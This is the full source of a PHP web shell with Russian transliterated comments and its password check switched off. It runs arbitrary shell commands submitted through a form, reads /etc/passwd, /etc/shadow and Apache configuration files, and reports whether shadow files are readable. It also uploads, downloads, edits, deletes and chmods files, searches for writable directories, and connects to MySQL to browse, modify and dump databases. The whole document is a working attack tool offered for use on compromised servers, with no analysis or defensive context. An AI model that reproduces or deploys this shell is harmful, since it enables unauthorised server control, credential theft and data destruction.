<?php

                                       ##    ##  #
                                         ##     #  ####
                                           ## ##  ##  ##
                                       ###  ###  ##    #
                                     ### ##     ##     ##
                                   ##    ###  ##       ##
                                          #     #     ##
                                        ###    #     ##
                                      ### #   ##    ##
                                      #   ##  ##   ##
                                           #   #####
                                   #       ##   ###
                                  ##     ###     #
                                   #######
                                    #####

//error_reporting(0);
@ini_restore("safe_mode"); 
@ini_restore("open_basedir"); 
if(get_magic_quotes_gpc()){
while(list($key,$val)=each($_POST)){
$_POST[$key]=stripslashes($val);}}
set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$name='1'; 
$pass='c8d3a760ebab631565f8509d84b3b3f1';
if(false){#esli nado pishem 'true'
if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass){
header('WWW-Authenticate: Basic realm="Auth"');header('HTTP/1.0 401 Unauthorized');
exit;}}
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
function font($color,$text,$size=4){return("<font color=$color size=$size >$text</font>");}
function w($a){return str_repeat("&nbsp;",$a);}
function b($b){return "<b>$b</b>";}
function e($e){switch($e){
case 0:return('no such file');
case 1:return('no such dirictory');
case 2:return('permission denied');
case 3:return('is not dirictory');
case 4:return('is a dirictory');
}}
function test_file($filename){
return(file_exists($filename)?(is_readable($filename)?false:font('red',e(2))):font('red',e(0)));}
if(isset($_POST['downl']) && !empty($_POST['downf'])){
if(!preg_match('/^\//',$_POST['downf'])){
$_POST['downf']=$_POST['th'].'/'.$_POST['downf'];}
if(!test_file($_POST['downf'])){
if(!is_dir($_POST['downf'])){
$fd=fopen($_POST['downf'], "rb");
$nam=preg_replace('/.+\//','',$_POST['downf']);
header("Content-Type: application/octet-stream; name=\"".$nam."\"");
header("Content-Length: ".filesize($_POST['downf']));
header("Content-disposition: attachment; filename=\"".$nam."\"");
while(!feof($fd)){
$buffer=fgets($fd,4096);
echo $buffer;
}
fclose ($fd);
exit;
}
else $error=font('red',e(4));
}
else $error=test_file($_POST['downf']);}
if(isset($_POST['sql']) && !isset($_POST['exitsql'])){
$text="<body bgcolor=#C2DDFF>
<b>Mysql@server:user:pass:db</b>
<form method='POST'>
";
$a=array('server','user','password','db');$i=-1;
while($i++<3){
$text.= "<input type='text' name='".$a[$i]."' value='".((!empty($_POST[$a[$i]]))?$_POST[$a[$i]]:'')."'>\n";}
$text.="<input type='submit' name='sql' value='Connect'>
<input type='submit' name='exitsql' value='Exit'>";
$text="\n<body bgcolor=#C2DDFF>
<b>Mysql@server:user:pass:db</b>
<form method='POST'>\n";
$a=array('srv','user','pass','db');$i=-1;
while($i++<3){
$text.= "<input type='text' name='".$a[$i]."' value='".((!empty($_POST[$a[$i]]))?$_POST[$a[$i]]:(($i==0)?'localhost':null))."'>\n";}
$text.="<input type='submit' name='sql' value='Connect'><input type='submit' name='exitsql' value='Exit'>\n";
if(isset($_POST['sql'])){
if(isset($_POST['user']))$user=$_POST['user'];
if(isset($_POST['pass']))$password=$_POST['pass'];
if(isset($_POST['srv'])){
$server=$_POST['srv'];
$connect=mysql_connect($server,$user,$password) or die($text."</form>not connect");}
else{die($text."</form>");}
if(!empty($_POST['db'])){mysql_select_db($_POST['db'])or die("Could not select db<br>");}
function write($data){
switch($_POST['save']){
case 0:
global $dump;
$dump.=$data;
break;
case 1:
global $fp;
switch($_POST['compr']){
case 0:
fwrite($fp,$data);
break;
case 1:
gzwrite($fp, $data);
break;
case 2:
bzwrite($fp,$data);
break;}
break;}}
function sqlh(){
global $dump,$server;
write("#\n#Server : ".getenv('SERVER_NAME')."
#DB_Host : ".$server."
#DB : ".$_POST['db']."
#Table : ".$_POST['table_sel']."\n#\n\n");}
function sql(){
global $dump,$connect;
$row=mysql_fetch_row(mysql_query("SHOW CREATE TABLE `".$_POST['table_sel']."`",$connect));
write("DROP TABLE IF EXISTS `".$_POST['table_sel']."`;\n".$row[1].";\n\n");}
function sql1(){
global $connect;
$result=mysql_query("SELECT * FROM `".$_POST['table_sel']."`",$connect);
function test($aaa){
$d=array();
while (list($key,$val)=each($aaa)){$d[$key]=addslashes($val);}
return($d);}
while ($line=mysql_fetch_assoc($result)) {
((!isset($key))?($key=implode('`, `',array_keys($line))):null);
$ddd=test(array_values($line));
$val=implode('\', \'',$ddd);
write("INSERT INTO `".$_POST['table_sel']."`(`".$key."`) VALUES ('".$val."');\n");}
mysql_free_result($result);}
function head($tmpfname,$name){
header("Content-Type: application/octet-stream; name=\"$name\"");
header("Content-Length: ".filesize($tmpfname)."");
header("Content-disposition: attachment; filename=\"$name\"");
$fd=fopen($tmpfname, "r");
while(!feof($fd)){
echo fgets($fd, 4096);}
fclose($fd);
unlink($tmpfname);
exit;}
if(isset($_POST['back']) && isset($_POST['table_sel'])){
$dump='';
if($_POST['save']==1){
$tmpfname=tempnam($_POST['save_p'], "FOO");
switch($_POST['compr']){
case 0:
$fp=fopen($tmpfname,"w");
break;
case 1:
$fp=gzopen($tmpfname, "w9");
break;
case 2:
$fp=bzopen($tmpfname, "w");
break;}}
switch($_POST['as']){
case 0:
switch($_POST['as_sql']){
case 0:
sqlh();
sql();
break;
case 1:
sqlh();
sql();
sql1();
break;
case 2:
sqlh();
sql1();
break;}
if($_POST['save']==1){
switch($_POST['compr']){
case 0:
$n='.txt';
fclose($fp);
break;
case 1:
$n='.gz';
gzclose($fp);
break;
case 2:
$n='.bz2';
bzclose($fp);
break;}
head($tmpfname,$_POST['table_sel'].$n);}
break;
case 1:
$res=mysql_query("SELECT * FROM `".$_POST['table_sel']."`",$connect); 
if(mysql_num_rows($res) > 0) {
while($row = mysql_fetch_assoc($res)) { 
$values = array_values($row); 
foreach($values as $k=>$v) {$values[$k] = addslashes($v);} 
$values = implode($_POST['cvs_term'], $values); 
write($values);}}
break;}}
echo "$text\n<table height=200 width=100%><tr><td bgcolor=green width=10%>";
$db_list=mysql_list_dbs($connect);
echo "<select name='db' multiple size=30>\n";
while($row=mysql_fetch_object($db_list)){
$db1=$row->Database;
echo "<option value='$db1' ".(($db1===$_POST['db'])?'selected':'').">$db1</option>\n";}
echo "</select></td><td bgcolor=#CBC3B6>\n";
if(!empty($_POST['db'])){
$tb_list=mysql_list_tables($_POST['db']);
echo "<select name='table_sel' multiple size=30>";
for($i=0;$i<mysql_num_rows($tb_list);$i++){
$n=mysql_fetch_array(mysql_query('select count(*) from '.mysql_tablename($tb_list,$i)));
echo "<option value='".mysql_tablename($tb_list, $i)."'".($tr=((isset($_POST['table_sel']) && $_POST['table_sel']===mysql_tablename($tb_list, $i))?'selected':'')).">".mysql_tablename($tb_list, $i).'('.$n[0].")</option>";}
echo "</select></td><td width=100%>
<table  width=100% height=100% bgcolor='#E3FFF2'><tr><td height=20 bgcolor=#dfdfdf width=100%><nobr>\n";
if(isset($_POST['table_sel'])){
$c=array('Browse','SQL','Insert','Export');$i=-1;
while($i++<3){echo "<input type=radio Name='go' value='".($i)."'>".$c[$i];}}
echo "&nbsp;&nbsp;<b>".((isset($_POST['table_sel']))?$_POST['table_sel']:null)."</b></nobr></td></tr><tr width=100%><td width=100%>\n";}
if(isset($_POST['push']) && isset($_POST['querysql']) && preg_match('/^\s*select /i',$_POST['querysql']))$_POST['go']=0;
elseif(isset($_POST['push']))$_POST['go']=1;
if(isset($_POST['back']))$_POST['go']=3;
if(isset($_POST['brow']))$_POST['go']=0;
if(isset($_POST['editr']) && isset($_POST['edit']))$_POST['go']=4;
if(isset($_POST['ed_save']))$_POST['go']=5;
if(isset($_POST['editr']) && !isset($_POST['edit']))$_POST['go']=0;
if(isset($_POST['go'])){switch($_POST['go']){
case 0:
if(isset($_POST['querysql']) && preg_match('/^\s*select /i',$_POST['querysql']) && isset($_POST['push'])){
$n=mysql_fetch_array(mysql_query(preg_replace('/^\s*select\s+.+\s+from\s+/i','select count(*) from',$_POST['querysql'])));
$result=mysql_query($_POST['querysql'],$connect);}
else{$n=mysql_fetch_array(mysql_query('select count(*) from '.$_POST['table_sel']));$sort='';
if(!empty($_POST['sort']))$sort='ORDER BY `'.trim($_POST['sort']).'` ASC ';$co='0,20';
if(isset($_POST['br_st']) && isset($_POST['br_en'])){
$co=$_POST['br_en'].','.$_POST['br_st'];}
$result = mysql_query("SELECT * FROM `".$_POST['table_sel']."` $sort limit $co",$connect);}
for($i=0;$i<mysql_num_fields($result);$i++){
if(ereg('primary_key',mysql_field_flags($result, $i)))
$prim=mysql_field_name($result, $i);}
$up_e='';
echo "<div style='width:100%;height:450px;overflow:auto;'><table border=1>\n";
while($line=mysql_fetch_array($result,MYSQL_ASSOC)){echo "<tr bgcolor='#C1D2C5'>\n";
if(!isset($lk)){
echo "<td><b>EDIT</b></td>";
foreach(array_keys($line) as $lk){print((isset($prim) && $lk===$prim)?"<td><u><b>$lk</b></u></td>":"<td>$lk</td>\n");}}
if(!isset($prim)){
while(list($key,$val)=each($line)){$up_e.="`$key`='".addslashes($val)."' and ";}
$up_e=substr($up_e,0,-5);}
else{while(list($key,$val)=each($line)){
if($key===$prim){$up_e.="`$key`='".addslashes($val)."'";}}}
$up_e=urlencode($up_e);
echo "</tr><tr><td><input type=radio name=edit value='$up_e'></td>\n";
$up_e='';
foreach($line as $col_value){echo "<td>".((strlen($col_value)>40)?'<textarea cols=40 rows=7>'.htmlspecialchars($col_value).'</textarea>':htmlspecialchars($col_value))."</td>\n";}
echo "</tr>\n";}
echo "</table></div><input type=submit name='brow' value='Browse'><b>Sort by
<input type=text name=sort size=10 value='".((isset($_POST['sort']))?$_POST['sort']:'')."'>
Show <input type=text size=5 value=".((isset($_POST['br_st']))?$_POST['br_st']:$n[0])." name='br_st'>row(s) starting from<input type=text size=5 value=".((isset($_POST['br_en']))?$_POST['br_en']:'0')." name='br_en'></b>
<input type=submit name=editr value=Edit>";
mysql_free_result($result);
break;
case 1:
echo "<input type=submit name=push value=Run><br>
<textarea cols=70% rows=8 name='querysql'>\n".((!empty($_POST['querysql']))?htmlspecialchars($_POST['querysql'],ENT_QUOTES):((isset($_POST['table_sel']))?"SELECT * FROM `".$_POST['table_sel']."` WHERE 1":null))."</textarea><br><br>\n";
if(!empty($_POST['querysql'])){
$result = mysql_query($_POST['querysql'],$connect) or print("<div style='background-color:red;'>".mysql_error($connect)."</div>");
echo "<div style='background-color:green;'>".mysql_info($connect)."</div>";}
break;
case 2:
echo "<div style='width:100%;height:550;overflow:auto;'><table>\n";
$fields=mysql_list_fields($_POST['db'],$_POST['table_sel'],$connect);
for($i=0;$i<mysql_num_fields($fields);$i++){
echo "<tr><td bgcolor=#DBDCDD><b>".mysql_field_name($fields,$i).'</td><td bgcolor=#B9C3D7>'.mysql_field_type($fields, $i).'('.mysql_field_len($fields, $i).")</b></td><td>".((mysql_field_len($fields, $i)<40)?"<input type='text' name='ed_key:".mysql_field_name($fields,$i)."' value='' size=40>":"<textarea name='ed_key:".mysql_field_name($fields,$i)."' cols=31 rows=7></textarea>")."</td></tr>\n";}
echo "</table></div><input type=hidden name=insert value=1><input type=submit name=ed_save value=Insert>";
break;
case 3:
if(!isset($_POST['back']))echo '<table height=250  align="center"><TR><TD>
<table height=100%>
<tr><td bgcolor="#A8B8F1" width="100" height="20"><b>&nbsp;&nbsp;Export as</b></td></tr>
<tr><td bgcolor="#D0E0FF" width="100" height="20"><input type=radio Name="as" value="0" checked><b>&nbsp;&nbsp;SQL</b></td></tr>
<tr><td bgcolor="#D0E0FF" width="100" height="20"><input type=radio Name="as" value="1"><b>&nbsp;&nbsp;CSV</b></td></tr>
<tr><td height=100%></td></tr>
</table></TD><td>
<table width="140" height=100%>
<TR><TD bgcolor="#A8B8F1"  height="20"><b>&nbsp;&nbsp;SQL</b></TD></TR>
<TR><TD bgcolor="#D0E0FF"  height="20"><input type=radio Name="as_sql" value="0" ><b>Only structure</b></TD></TR>
<TR><TD bgcolor="#D0E0FF"  height="20"><input type=radio Name="as_sql" value="1" checked><b>All</b></TD></TR>
<TR><TD bgcolor="#D0E0FF"  height="20"><input type=radio Name="as_sql" value="2"><b>Only data</b></TD></TR>
<TR><TD bgcolor="#A8B8F1"  height="20"><b>CSV</b></TD></TR>
<TR><TD bgcolor="#D0E0FF"  height="20"><b>Terminated&nbsp;</b><input size=2 type=text Name="cvs_term" value=":"></TD></TR>
<tr><td height=100%></tb></tr>
</table>
</td><td>
<table height=100%>
<tr><td bgcolor="#E6D29C" width="100" height="20"><input type=radio Name="save" value="0" checked><b>&nbsp;View</b></td></tr>
<tr><td bgcolor="#E6D29C" width="100" height="20"><input type=radio Name="save" value="1"><b>&nbsp;Download</b></td></tr>
<tr><td bgcolor="#E6D29C" width="130" height="40"><b>&nbsp;Temp path</b><br><input type=text Name="save_p" value="/tmp"></td></tr>
<tr><td height=100%></td></tr>
</table></td><td>
<table width="120" height=100%>
<TR><TD bgcolor="#A8B8F1"  height="20"><b>&nbsp;&nbsp;Compression</b></TD></TR>
<TR><TD bgcolor="#D0E0FF"  height="20"><input type=radio Name="compr" value="0" checked><b>None</b></TD></TR>'.
((@function_exists('gzencode'))?'<TR><TD bgcolor="#D0E0FF"  height="20"><input type=radio Name="compr" value="1" ><b>Gzip</b></TD></TR>':'').
((@function_exists('bzcompress'))?'<TR><TD bgcolor="#D0E0FF"  height="20"><input type=radio Name="compr" value="2"><b>Bzip</b></TD></TR>
<tr><td height=100%></td></tr>':'').'</table></td></TR>
<tr><td><input type=submit value=backup name=back></td></tr>
</table>';
if(isset($_POST['back']) && isset($_POST['table_sel'])){
if($_POST['save']==0){echo "<textarea cols=70 rows=10>".htmlspecialchars($dump)."</textarea>";}}
break;
case 4:
if(isset($_POST['edit'])){
$up_e=$_POST['edit'];
echo "<input type=hidden name=edit value='$up_e'>";
$up_e=urldecode($_POST['edit']);
echo "<div style='width:100%;height:550;overflow:auto;'><table>\n";$fi=0;
$result = mysql_query("SELECT * FROM `".$_POST['table_sel']."` WHERE $up_e",$connect);
while($line=mysql_fetch_array($result,MYSQL_ASSOC)){
foreach($line as $key=>$col_value) {
echo "<tr><td bgcolor=#DBDCDD><b>".mysql_field_name($result,$fi).'</td><td bgcolor=#B9C3D7>'.mysql_field_type($result,$fi).'('.mysql_field_len($result,$fi).")</b></td><td>".((mysql_field_len($result,$fi)<40)?"<input type='text' name='ed_key:".mysql_field_name($result,$fi)."' value='".htmlspecialchars($col_value,ENT_QUOTES)."' size=40>":"<textarea name='ed_key:".mysql_field_name($result,$fi)."' cols=31 rows=7>".htmlspecialchars($col_value,ENT_QUOTES)."</textarea>")."</td></tr>\n";
$fi++;}}
echo "</table></div><input type=submit name=ed_save value=Save>";}
break;
case 5:
$ted='';
$_POST2=$_POST;# X.Z. zachem, xernya kakaeto :)
while(list($key1,$val1)=each($_POST2)){
if(preg_match('/ed_key:(.+)/',$key1,$m))
{$ted.="`".$m[1]."`= '".addslashes($val1)."', ";}}
$ted=substr($ted,0,-2);
$query=((isset($_POST['insert']))?"INSERT":"UPDATE")." `".$_POST['table_sel']."` SET $ted ".((isset($_POST['insert']))?'':"WHERE ".urldecode($_POST['edit'])." LIMIT 1 ");
echo "<div style='background-color:white;'>".htmlspecialchars($query,ENT_QUOTES)."</div><br>";
$result = mysql_query($query,$connect) or print("<div style='background-color:red;'>".mysql_error($connect)."</div>");
echo "<div style='background-color:green;'>".mysql_info($connect)."</div>";
break;}}
echo "</td></tr></table></td></tr></table><input type=hidden name=sql>\n";}
else echo $text;
echo "</form></body>";exit;}
echo "<html><body bgcolor=white><center><table bgcolor=orange height=10 border=1><tr><td><nobr>".font('blue',@php_uname())."</nobr></td></tr></table><table bgcolor=orange height=10 border=1><tr><nobr><td>".font('blue','PHP:'.@phpversion())."</nobr></td><td><nobr>".font('blue',date('H:i:s l d F Y'))."</nobr></td><td><nobr>".font('blue',getenv('SERVER_ADDR'))."</nobr></td><td><nobr>".font('blue',getenv('REMOTE_ADDR'))."</nobr></td></tr></table><br></center>\n";
if(!test_file('/etc/shadow'))echo font('red',b('shadow readable<br>'));
if(!test_file('/etc/shadow-'))echo font('red',b('shadow- readable<br>'));
if(!test_file('/etc/master.passwd'))echo font('red',b('master.passwd readable<br>'));
if(!empty($_POST['th']))@chdir($_POST['th']);
echo ((is_writable('/tmp/'))?font('green',"TEMP USE".w(1)):font('red',"TEMP NO USE"));
#UP
if(isset($_POST['up']))@chdir('../');
#CD
if(isset($_POST['c']) && $_POST['cd']!=''){
if(!test_file($_POST['cd'])){
if(is_dir($_POST['cd'])){
@chdir($_POST['cd']);
}
else $error=font('red',e(3));
}
else $error=test_file($_POST['cd']);}
echo w(3)."<input type=text size=60 value=".getcwd().">";
echo font('blue','USER : '.get_current_user());
if(file_exists("/"))
echo((is_readable("/"))?w(2).font('green','DIR / - IS READ'):w(2).font('red','DIR / - IS NO READ'));
if(file_exists("C:/"))
echo((is_readable("C:/"))?w(2).font('green','DIR C:/ - IS READ'):w(2).font('red','DIR C:/ - IS NO READ'));
if(ini_get('safe_mode'))echo w(2).font('red','SAFE MODE');
echo "<br>";
?>
<hr>
<form method=POST name=main>
<input type="submit" value="^" name="up">
<input type=text name=cd>
<input type=submit value=cd name=c>
<input type=text name=open>
<input type=submit value=open name=op>
<input type=text name=new>
<input type=submit name=cr value="new file">
<input type=text name=exec>
<input type=submit name=exe value=exec>
<input type=submit name=info value=phpinfo>
<br>
<?php
$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/etc/hosts','/proc/version','/proc/cpuinfo','/proc/meminfo','/etc/httpd/conf/httpd.conf','/usr/local/apache/conf/httpd.conf','/etc/apache/conf/httpd.conf','/usr/local/httpd/conf/httpd.conf','/usr/local/etc/httpd/conf/httpd.conf','/etc/syslog.conf');
echo '<select name=passwd>';
foreach($ar_file as $ar_l){
if(!test_file($ar_l))echo "<option value='$ar_l'>$ar_l</option>\n";}
echo '</select><input type=submit name=passw value="read file">';
?>
<input type=submit name=menu value=upload>
<input type=text name=downf>
<input type=submit name=downl value=download>
<input type=text name="test">
<input type=submit name=tes value="perms">
<input type="submit" name="sql" value="mysql">
<input type="submit" name="eval" value="eval">
<br>
<input type=text name=strin>
<input type=text name=remot>
<input type=submit name=copy value=copy>
<input type="text" name="renold" >
<input type="text" name="rennew" >
<input type="submit" name="rename" value="rename">
<input type=text name=rm >
<input type=submit name=del value=del>
<br>
<input type=reset value=RESET>
<input type="text" name="mkdir">
<input type="submit" name="mk" value="mkdir">
<input type="text" name="rmdir">
<input type="submit" name="rmd" value="rmdir">
<input type="text" name="ch_mod">
<?php
for($bch=1;$bch<=3;$bch++){echo"<select name=ch_p$bch>\n";
for($ach=7;$ach>=0;$ach--){echo"<OPTION value=$ach>$ach</OPTION>";}
echo"</select>";}
?>
<input type="submit" name="ch_chmod" value="chmod">
<input type=submit name=find value='find writeable'>
<br>
<hr>
<?php
#FIND WRITEABLE##############
if(isset($_POST['find'])){
echo b('Start path: <input type=text name=fpath>Only dir<input type=checkbox name="dy" checked>Only writeable:<input type=checkbox name="onw" checked><input type=submit name=fww value="Find it">');}
if(isset($_POST['fww']) && !empty($_POST['fpath'])){
echo b('Start path: <input type=text name=fpath>Only dir<input type=checkbox name="dy" '.(isset($_POST['dy'])?'checked':null).'>Only writeable:<input type=checkbox name="onw" '.(isset($_POST['onw'])?'checked':null).'><input type=submit name=fww value="Find it"><hr>');
$arrfw=array($_POST['fpath']);
$ife=0;
while(++$ife<=count($arrfw)){
$pathfw=$arrfw[$ife-1];
if(is_readable($pathfw)){
if($hfw=opendir($pathfw)){
while(false!==($ffw=readdir($hfw))){
$ffw=$pathfw.$ffw;
if(!preg_match('/\/\.+$/',$ffw)){
if(is_dir($ffw)){array_push($arrfw,$ffw.'/');}
print(is_dir($ffw)?(is_writeable($ffw)?font('red',"$ffw/<br>",3) :(isset($_POST['onw'])?null:"$ffw/<br>")):(!isset($_POST['dy'])?(is_writeable($ffw)?font('green',"$ffw<br> ",3):(isset($_POST['onw'])?null:"$ffw<br>")):null));}}
closedir($hfw);}}}}


if(isset($_POST['eval'])){
echo "<textarea cols=70 rows=7 name='ev'></textarea>\n";





echo "";
}
############################################################################
#RENAME
if(isset($_POST['rename']) && $_POST['renold']<>'' && $_POST['rennew']<>''){
if(file_exists($_POST['renold'])){
@rename($_POST['renold'],$_POST['rennew']);
}
else $error=font('red',e(0));
}
#

#RMDIR
if(isset($_POST['rmd']) && isset($_POST['rmdir'])){
if(file_exists($_POST['rmdir'])){
if(is_dir($_POST['rmdir'])){
if(@rmdir($_POST['rmdir'])) echo font('green',"dir ".b($_POST['rmdir'])." delet"); 
else $error=font('red','dir not deleted');
}
else $error=font('red',e(3));
}
else $error=font('red',e(0));
}
#
#CHMOD
if(isset($_POST['ch_chmod']) && isset($_POST['ch_mod'])){
if(file_exists($_POST['ch_mod'])){
@chmod($_POST['ch_mod'],octdec($_POST['ch_p1'].$_POST['ch_p2'].$_POST['ch_p3']));}
else $error=font('red',e(0));}
#
#DELETE
if(isset($_POST['del']) && $_POST['rm']!=''){
if(file_exists($_POST['rm'])){
if(!is_dir($_POST['rm'])){
@unlink($_POST['rm']);
}
else echo "<br>".font('red',e(4)."<br>");
}
else echo "<br>".font('red',e(0)."<br>");
}
#
#EXEC
if(!empty($_POST['exe'])){
if(@exec($_POST['exec'],$ar)){
echo "<textarea cols=70 rows=15>";
foreach($ar as $line){
echo $line."\n";
}
echo "</textarea>";}}
#
#OPEN FILE
if(isset($_POST['op']) && $_POST['open']!=''){
if(!test_file($_POST['open'])){
if(!is_dir($_POST['open'])){
$fil=file($_POST['open']);
echo "<textarea cols=100 rows=20 name=edit>";
foreach($fil as $vv){
echo htmlspecialchars($vv);
}
echo "</textarea><br>".font('green',"FILE : ".$_POST['open'],3);
if(is_writable($_POST['open'])==1){
echo w(2).font('green','ACCESS GRANTED');
echo "<input type=submit name=save value=save><input type=hidden value=".$_POST['open']." name=sv>";
}}
else $error=font('red',e(2));
}
else $error=test_file($_POST['open']);
}
if(isset($_POST['save'])){
$fr=fopen($_POST['sv'],"w");
$out=$_POST['edit'];
fputs($fr,$out);
fclose($fr);
}
#
#CREATE FILE
if(isset($_POST['cr']) && $_POST['new']!=''){
if(is_writable(dirname($_POST['new']))){
echo font('green',"Create new file : ".$_POST['new'],3)."<br><textarea name=newf cols=100 rows=20></textarea>
<input type=submit name=cre value=create>
<input type=hidden value=".$_POST['new']."  name=nf>";
}
else echo "<br>".font('red',e(2)."<br>");
}
if(isset($_POST['cre'])){
$ee=fopen($_POST['nf'],'w+');
$out=$_POST['newf'];
fputs($ee,$out);
fclose($ee);
}
#
#MKDIR
if(isset($_POST['mk']) && $_POST['mkdir']!=''){
if(is_writeable('./')){
@mkdir($_POST['mkdir']);
echo font('green',"dir ".b($_POST['mkdir'])." create"); 
}
else echo font('red',e(2));
}
#
echo "<input type=hidden name=th value=".getcwd()."></form>";
#UPLOAD FILE
if(isset($_POST['menu']) || isset($_POST['qq'])){
echo "
<form enctype=multipart/form-data  method=post>
Save as :<input type=text name=name>File :<input name=userfile type=file>
<input type=submit value=Send name=go_up>
<input type=hidden name=qq>
<input type=hidden name=th value=".getcwd()."></form>";
if(isset($_POST['go_up'])){
if(isset($_POST['name']) && $_POST['name']==''){
$_POST['name']=$_FILES['userfile']['name'];}
if(!preg_match('/^\//',$_POST['name'])){
$_POST['name']=$_POST['th'].'/'.$_POST['name'];}
if(is_uploaded_file($_FILES['userfile']['tmp_name'])){
@copy($_FILES['userfile']['tmp_name'],$_POST['name']);}
else echo "<br>".font('red',"Permisions denied");}}
#
#TEST PERM
if(isset($_POST['tes']) && $_POST['test']!=''){
$j=$_POST['test'];
if(file_exists($j)){
$w='';
if(is_writeable($j)){
$w=w(1).'WRITE'.w(1);
}
if(is_readable($j)){
$w=$w.w(1).'READ'.w(1);
}
echo font('green',$w.sprintf("%o", (fileperms($_POST['test'])) & 0777));
}
else echo font('red',$e(0));
}
#
#COPY
if(isset($_POST['copy'])&& $_POST['strin']!='' && $_POST['remot']!=''){
if(file_exists(dirname($_POST['remot']))){
if(file_exists($_POST['strin'])){
if(is_writable(dirname($_POST['remot']))){
if(is_readable($_POST['strin'])){
@copy($_POST['strin'],$_POST['remot']);
}
else echo font('red',"no read string file");
}
else echo font('red',"no write dest directory");
}
else echo font('red',"no such file");
}
else echo font('red',"no such dest dir");
}
#
#CHECK DISK
if(isset($_POST['free']) && $_POST['dirfree']!=''){
if(file_exists($_POST['dirfree'])){
$fre=@disk_free_space($_POST['dirfree'])/1048576;
echo font('green',"Free space in ".b($_POST['dirfree'])." : ".$fre." Mb");
$fre1=@disk_total_space($_POST['dirfree'])/1048576;
echo "<br>".font('green',"Full size in ".b($_POST['dirfree'])." : ".$fre1." Mb");
}
else echo font('red',"No such disk");
}
#
(isset($_POST['info']))?phpinfo():null;
#
#PASSWD
if(!empty($_POST['passwd']) && isset($_POST['passw'])){
echo "<center>".font('blue',"file : ".$_POST['passwd'],6)."</center><br><textarea cols=100 rows=15>\n";
foreach(@file($_POST['passwd']) as $fed)echo $fed;
echo "</textarea><br>\n";}
#
if(isset($error))echo $error;?>
<hr><?php
##################################################################################
if(is_readable(getcwd())){
if($h=opendir(getcwd())){
$arr=array();
while(false!==($f=readdir($h))){array_push ($arr,$f);}
closedir($h);}}
else die("<center>".b(font('red','FUNCTION LIST PERMISSION DENIED',6))."</center>");
sort($arr);
echo '<table width=800 bgcolor=#DFD6C8 cellspacing=0 cellpadding=0 border=1>';
foreach($arr as $f){
$l=@lstat($f);
print((is_readable($f) && is_writeable($f))?"<tr><td>".w(1).b("R".w(1).font('red','RW',3)).w(1):(((is_readable($f))?"<tr><td>".w(1).b("R").w(4):"").((is_writable($f))?"<tr><td>".w(1).b(font('red','RW',3)):"")));
$r=sprintf("%o",(@fileperms($f)) & 0777);
$ow=posix_getpwuid($l[4]);
$gr=posix_getgrgid($l[5]);
$fow=($ow["name"]?$ow["name"]:fileowner($f))."/".($gr["name"]?$gr["name"]:filegroup($f));
if(!is_readable($f) && !is_writeable($f)) echo "<tr><td>".w(12);
echo "</td><td>$r</td><td>$fow</td>";
if(!is_dir($f)){
if(!is_link($f)){
echo w(2)."<td><i>".$l[7]."</i></td>";}
else echo "</td><td>link</td>";}
else echo "</td><td>DIR</td>";
$fi=htmlspecialchars($f);
echo "<td>".@strftime('%B %e %H:%M',@filemtime($f))."</td><td>".(is_dir($f)?font('blue',$fi,3):$fi)."</td>\n";}
?>
</table></body></html>
<?php exit; ?>
